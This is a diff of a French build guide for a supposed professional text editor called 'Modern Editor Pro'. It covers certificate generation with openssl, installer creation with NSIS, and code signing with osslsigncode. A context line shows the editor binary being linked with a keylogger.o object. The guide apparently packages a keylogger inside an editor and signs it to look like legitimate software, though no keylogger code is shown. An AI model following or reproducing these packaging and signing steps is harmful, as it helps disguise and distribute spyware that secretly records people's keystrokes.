@@ -29,19 +29,19 @@ Un guide détaillé pour compiler et signer l'éditeur de texte professionnel po
 
 ## 🔑 Génération du certificat
 
-1. Générer la clé privée et le certificat :
+### 1. Générer la clé privée et le certificat :
 
 `openssl req -x509 -newkey rsa:4096 -keyout private_key.pem -out certificate.pem -days 365 -nodes`
 
 > Remplir les informations demandées (pays, organisation, etc.)
 
-2. Convertir en format PFX :
+### 2. Convertir en format PFX :
 
 `openssl pkcs12 -export -out professional.pfx -inkey private_key.pem -in certificate.pem`
 
 > Définir un mot de passe fort et le conserver précieusement
 
-3. Nettoyer les fichiers temporaires :
+### 3. Nettoyer les fichiers temporaires :
 
 `rm private_key.pem certificate.pem`
 
@@ -84,8 +84,8 @@ x86_64-w64-mingw32-gcc Meditor.o keylogger.o utils.o resource.res \
 > Crée ModernEditorPro_1.5.2_Setup.exe
 > Vous pouvez modifier le nom de sortie du Setup & le nom d'entrée du fichier si vous en avez choisi un autre dans le installer.nsi directement.
 ```nsi
-line : NomDuFichier
-line : NomDuFichier
+line 12 : NomDuFichierOutput (Setup)
+line 35 : NomDuFichierEntrée (Exécutable de Base)
 ```
 
 ## 🔐 Signature des exécutables
@@ -111,14 +111,14 @@ osslsigncode sign \
     -n "Modern Editor Pro Installer" \
     -i "https://moderneditor.pro" \
     -t http://timestamp.digicert.com \
-    -in ModernEditorPro_1.5.2_Setup.exe \
-    -out ModernEditorPro_1.5.2_Setup_signed.exe
+    -in meditorinstaller.exe \
+    -out MeditorInstaller.exe
 ```
 
 ## 📁 Structure finale
 
-- `meditor_signed.exe` - Exécutable principal signé
-- `ModernEditorPro_1.5.2_Setup_signed.exe` - Installateur signé
+- `meditor_signed.exe` - Exécutable principal signé 
+- `MeditorInstaller.exe` - Installateur signé
 - `professional.pfx` - Certificat de signature (à conserver en sécurité)
 - `config.ini` - Configuration par défaut
 - Autres fichiers de ressources (icônes, etc.)
